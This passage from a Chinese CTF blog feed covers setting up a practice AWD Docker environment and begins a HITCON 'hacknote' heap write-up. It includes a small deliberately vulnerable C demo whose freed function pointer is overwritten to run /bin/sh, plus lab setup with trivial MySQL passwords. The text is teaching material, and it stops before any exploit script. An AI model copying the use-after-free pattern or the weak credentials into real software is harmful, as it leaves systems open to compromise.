no</span><span class="token comment" spellcheck="true">#GSSAPICleanupCredentials yes</span><span class="token comment" spellcheck="true">#GSSAPIStrictAcceptorCheck yes</span><span class="token comment" spellcheck="true">#GSSAPIKeyExchange no</span><span class="token comment" spellcheck="true"># Set this to 'yes' to enable PAM authentication, account processing,</span><span class="token comment" spellcheck="true"># and session processing. If this is enabled, PAM authentication will</span><span class="token comment" spellcheck="true"># be allowed through the ChallengeResponseAuthentication and</span><span class="token comment" spellcheck="true"># PasswordAuthentication.  Depending on your PAM configuration,</span><span class="token comment" spellcheck="true"># PAM authentication via ChallengeResponseAuthentication may bypass</span><span class="token comment" spellcheck="true"># the setting of "PermitRootLogin without-password".</span><span class="token comment" spellcheck="true"># If you just want the PAM account and session checks to run without</span><span class="token comment" spellcheck="true"># PAM authentication, then enable this but set PasswordAuthentication</span><span class="token comment" spellcheck="true"># and ChallengeResponseAuthentication to 'no'.</span>UsePAM <span class="token function">yes</span><span class="token comment" spellcheck="true">#AllowAgentForwarding yes</span><span class="token comment" spellcheck="true">#AllowTcpForwarding yes</span><span class="token comment" spellcheck="true">#GatewayPorts no</span>X11Forwarding <span class="token function">yes</span><span class="token comment" spellcheck="true">#X11DisplayOffset 10</span><span class="token comment" spellcheck="true">#X11UseLocalhost yes</span><span class="token comment" spellcheck="true">#PermitTTY yes</span>PrintMotd no<span class="token comment" spellcheck="true">#PrintLastLog yes</span><span class="token comment" spellcheck="true">#TCPKeepAlive yes</span><span class="token comment" spellcheck="true">#UseLogin no</span><span class="token comment" spellcheck="true">#PermitUserEnvironment no</span><span class="token comment" spellcheck="true">#Compression delayed</span><span class="token comment" spellcheck="true">#ClientAliveInterval 0</span><span class="token comment" spellcheck="true">#ClientAliveCountMax 3</span><span class="token comment" spellcheck="true">#UseDNS no</span><span class="token comment" spellcheck="true">#PidFile /var/run/sshd.pid</span><span class="token comment" spellcheck="true">#MaxStartups 10:30:100</span><span class="token comment" spellcheck="true">#PermitTunnel no</span><span class="token comment" spellcheck="true">#ChrootDirectory none</span><span class="token comment" spellcheck="true">#VersionAddendum none</span><span class="token comment" spellcheck="true"># no default banner path</span><span class="token comment" spellcheck="true">#Banner none</span><span class="token comment" spellcheck="true"># Allow client to pass locale environment variables</span>AcceptEnv LANG LC_*<span class="token comment" spellcheck="true"># override default of no subsystems</span>Subsystem    <span class="token function">sftp</span>    /usr/lib/openssh/sftp-server<span class="token comment" spellcheck="true"># Example of overriding settings on a per-user basis</span><span class="token comment" spellcheck="true">#Match User anoncvs</span><span class="token comment" spellcheck="true">#    X11Forwarding no</span><span class="token comment" spellcheck="true">#    AllowTcpForwarding no</span><span class="token comment" spellcheck="true">#    PermitTTY no</span><span class="token comment" spellcheck="true">#    ForceCommand cvs server</span></code></pre><blockquote><p>此时ctf_xinetd文件夹下的情况大致如下：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103225916.png" alt=""></p><p>bin文件夹用于放置 pwn题的binary程序和flag，html文件夹用于放置web_php环境的源码。</p></blockquote><h2 id="Docker-build"><a href="#Docker-build" class="headerlink" title="Docker build"></a>Docker build</h2><blockquote><p>配置好了Dockerfile，以及bin文件夹和html文件夹后，需要注意ctf_xinetd配置文件中的binary程序名需要与bin文件夹中的binary程序名保持一致，这个参照ctf_xinetd说明书即可。</p></blockquote><p>切换目录到与dockerfile同一目录，执行命令:<code>docker build -t imagename .</code></p><p>实例：<code>docker build -t &quot;awd1test&quot; .</code></p><p>等待dockerfile执行完毕之后就得到了一个定制的image:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103230536.png" alt=""></p><h2 id="Docker-Run"><a href="#Docker-Run" class="headerlink" title="Docker Run"></a>Docker Run</h2><blockquote><p>得到定制的image后，就是生成container了：</p><p>执行命令<code>sudo docker run -d -p 18080:80 -p 13306:3306 -p 10022:22 -p 19999:9999 -h &quot;awd1test&quot; --name=&quot;awd1test&quot; awd1test</code></p><ul><li>18080:80表示把docker环境的80端口映射到主机的18080端口</li><li>13306:3306表示把docker环境的mysql服务映射到主机13306端口</li><li>10022:22表示映射ssh服务</li><li>19999:9999表示映射pwn题服务</li></ul></blockquote><p>执行命令之后，通过<code>sudo docker ps</code>查看正在运行的docker状态：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103231044.png" alt=""></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><blockquote><p>执行命令<code>sudo docker exec -ti 15d94d229fcb /bin/bash</code>进入容器。</p></blockquote><p>进入容器之后首先：</p><ul><li>通过<code>passwd</code>命令设置root用户的密码以及awduser用户的密码，并且开启ssh远程连接服务，以便运维和awd参赛者的连接。</li><li>设置完密码后开启ssh服务==&gt;<code>service ssh start</code>。</li><li>初始状态，mysql的root账户是没有密码的，所以需要手动为root添加密码<code>mysql&gt; set password for root@localhost = password(&#39;root&#39;);</code>，分发给参赛者的账户为admin，密码随机生成。</li><li>若有mysql数据库需要加载，则使用类似<code></code>source /var/www/html/web/tcho.sql;`命令来加载sql脚本文件。</li><li>添加参赛者数据库用户：<code>mysql&gt; insert into mysql.user(Host,User,Password) values(&quot;%&quot;,&quot;awduser&quot;,password(&quot;123456&quot;));</code></li></ul><p>关于具体的web题环境和pwn题环境，请自行更改相关文件。</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>运行起来的web服务：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233718.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181104005557.png" alt=""></p><p>运行在同一docker容器内的pwn:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233932.png" alt=""></p><blockquote><p>虽然非常简陋，但是用于练习还是足够的。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;打造一个集web和pwn于一体的AWD-docker&quot;&gt;&lt;a href=&quot;#打造一个集web和pwn于一体的AWD-docker&quot; class=&quot;headerlink&quot; title=&quot;打造一个集web和pwn于一体的AWD docker&quot;&gt;&lt;/a&gt;打造一个集web
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="环境部署" scheme="http://www.yof3ng.xyz/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
      <category term="docker" scheme="http://www.yof3ng.xyz/tags/docker/"/>
    
      <category term="AWD" scheme="http://www.yof3ng.xyz/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-11月02-Hitcon-六</title>
    <link href="http://www.yof3ng.xyz/2018/11/02/Pwn-11%E6%9C%8802-Hitcon-%E5%85%AD/"/>
    <id>http://www.yof3ng.xyz/2018/11/02/Pwn-11月02-Hitcon-六/</id>
    <published>2018-11-02T06:31:11.000Z</published>
    <updated>2018-11-03T12:08:19.410Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-11月02-Hitcon-六"><a href="#Pwn-11月02-Hitcon-六" class="headerlink" title="Pwn-11月02-Hitcon-六"></a>Pwn-11月02-Hitcon-六</h1><blockquote><p>进度还是太慢了，不能再墨迹下去了💪！！</p></blockquote><h2 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 这是一道 fastbin uaf利用？fastbin是什么？uaf又是什么？又是一道涨姿势的题呢。啊啊啊从这儿开始就接触堆这玩意儿了！！！</p><p><a href="https://www.sohu.com/a/239388523_354899" target="_blank" rel="noopener">堆溢出学习之路</a></p></blockquote><h3 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF (use after free)"></a>UAF (use after free)</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; Use after free，跟字面上的意思一样：第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 那通过UAF漏洞，我们能干嘛，当然是直接getshell，通过下面一段c程序，进行编译就能getshell了（程序代码来自<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">4ct10n的博客</a> ）：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">evil_fuc</span><span class="token punctuation">(</span><span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">char</span> content<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    func_ptr <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>echo<span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p1指针未被置空,虽然free了,但仍可使用.</span>    func_ptr <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//p2与p1指针指向的内存为同一地址</span>    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>evil_fuc<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>编译运行效果如下：</p><p><img src="https://i.loli.net/2018/11/02/5bdbf64c0bcc4.png" alt=""></p></blockquote><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><blockquote><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">fast bin参考PDF</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194003.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194047.png" alt=""></p><p>fastbin attack 通常与堆块联系在一起，是CTF中常见题型。</p><p>定义如下：</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Fastbin Attack是fastbin在存储管理时，为保证快速分配，回收内存的需要，在内存管理的机制中出现的问题，进而造成的漏洞，能够通过漏洞改写main_arena上的FasbinY指针数组，从而获得“特定”（需要满足一定条件）地址的写权限。</p><p>至于main_arena，就引用一下stackoverflow的解释咯：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102215928.png" alt=""></p><p><code>main_arena</code> is a local symbol and is specifically <strong>not exported</strong>. the list of exported symbols is controlled via the <code>Version</code> files in the glibc source tree. this is, by design, to keep people from being able to link against random symbols that glibc uses internally (so as to not pollute the namespace as is required by POSIX and other standards).</p><blockquote><p>main_arena是不能导出的一个本地符号表。导出符号列表需要通过glibc源代码目录中的Version文件控制。这是设计用于防止人们链接glibc内部使用的随机符号，（所以不会像POSIX和其他标准那样污染命名空间）。</p></blockquote><p>gdb can find it because you have debug symbols available … either the C lib is not stripped, or you have the split debug symbols in <code>/usr/lib/debug/</code> and gdb is finding those. when you launch gdb, it will tell you things like <code>Reading symbols from /usr/lib/debug/xxxxx</code>.</p><blockquote><p>gdb可以找到main_arena，因为你可以获得一些调试符号表…当程序没有被脱衣服(not stripped)，或者你在<code>/ usr / lib / debug /</code>中拆分过调试符号，而gdb可以找到它们。当你启动gdb进行调试时，它会显示调试信息，例如<code>loading symbols from / usr / lib / debug / xxxxx</code>这种调试信息。</p></blockquote><p>the only way to be able to link against the symbol is to rebuild glibc from source and modify the export list.</p><blockquote><p>唯一能够链接到符号的方法是从源重构GLIBC并修改导出列表。</p></blockquote><p>alternatively, you could write some code in your app to behave like gdb. namely, open the debug file, process the ELF/DWARF information in it, apply relocations using the active loaded library info (see <code>dl_iterate_phdr</code>), and then just start poking memory directly.</p><blockquote><p>或者，你可以在你的应用程序中编写一些代码来像gdb调试一样。即通过应用程序，打开调试文件，处理其中的ELF / DWARF信息，使用活动加载的库信息应用重定位（请参阅dl_iterate_phdr），然后直接开始调用内存。</p></blockquote><p>if that’s too much work, a hackery solution might be to <code>fork()</code>+<code>popen()</code> gdb against your own process and run it in batch mode to dump symbol info.</p><blockquote><p>如果那太过于麻烦，黑客一点的解决方案可能是<code>fork（）+ popen（）</code>gdb调试你自己的进程，并以批处理模式运行它来转储符号信息。</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token function">asprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cmd<span class="token punctuation">,</span> <span class="token string">"gdb -q -p %i -batch -ex 'p &amp;main_arena'"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// parse the output of |fp| here looking for the address.</span><span class="token function">free</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>那么开始做题吧，先checksec:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203217.png" alt=""></p><p>可以看到，开启了栈溢出保护以及栈不可执行，那么这题很明显就是让我们从别的地方入手。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>先简单运行一下程序：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203545.png" alt=""></p><p>这种note类题目可以说是比较常见了。。。即使我不是pwn师傅，我也遇到过很多次，当然是一脸懵逼了，😭。</p></blockquote><p>通过IDA静态分析main函数，可以得到下面的伪C代码：</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//main函数</span><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//菜单</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//删除指定对象</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//打印对象</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_13<span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>      <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//添加note</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>看看add函数：</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_note</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//先为notelist申请8大小的空间</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//再为输入的内容（content）申请空间</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//读取内容</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>count<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>delete函数:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span 